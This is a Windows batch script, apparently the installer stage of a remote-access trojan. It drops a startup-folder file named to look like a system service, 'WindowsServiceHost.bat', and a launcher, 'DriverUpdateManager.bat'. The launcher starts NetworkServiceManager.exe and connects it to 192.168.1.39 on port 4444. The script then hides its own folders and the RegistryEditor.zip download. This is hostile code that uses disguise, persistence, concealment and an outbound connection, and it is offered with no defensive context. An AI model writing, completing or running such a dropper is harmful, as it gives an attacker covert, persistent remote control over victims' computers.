@echo off

timeout /t 2 >nul

REM Determine the directory where this batch file is located
set "script_dir=%~dp0"

REM Create the batch file for startup folder (WindowsServiceHost.bat)
(
  echo @echo off
  echo timeout /t 3 >nul  REM Wait 3 seconds for computer startup
  echo cd /d "%~dp0"
  echo call "%~dp0DriverUpdateManager.bat"
) > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsServiceHost.bat"

REM Create the batch file to run NetworkServiceManager.exe (DriverUpdateManager.bat)
(
  echo @echo off
  echo REM Kill all instances of NetworkServiceManager.exe
  taskkill /f /im NetworkServiceManager.exe >nul 2>&1
  timeout /t 1 >nul
  start NetworkServiceManager.exe -run
  timeout /t 1 >nul
  NetworkServiceManager.exe -connect 192.168.1.39::4444
) > "%script_dir%DriverUpdateManager.bat"

REM Check if both batch files exist in their respective locations
if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsServiceHost.bat" (
  >nul echo WindowsServiceHost.bat created successfully in Startup folder.
) else (
  >nul echo Failed to create WindowsServiceHost.bat in Startup folder.
)

if exist "%script_dir%DriverUpdateManager.bat" (
  >nul echo DriverUpdateManager.bat created successfully in current directory.
) else (
  >nul echo Failed to create DriverUpdateManager.bat in current directory.
)

REM Hide the RegistryEditor folder and its parent folder
attrib +h "%script_dir%\.."
attrib +h "%script_dir%\..\.."

REM Hide the RegistryEditor.zip file in the Downloads directory
attrib +h "%USERPROFILE%\Downloads\RegistryEditor.zip"

REM Start NetworkServiceManager.exe for the first time and wait for 12 seconds
start "" "%script_dir%NetworkServiceManager.exe"
timeout /t 12 >nul

REM Attempt to kill NetworkServiceManager.exe if it is running
taskkill /f /im NetworkServiceManager.exe >nul 2>&1

REM After waiting, call DriverUpdateManager.bat
call "%script_dir%DriverUpdateManager.bat"

REM End of main.bat
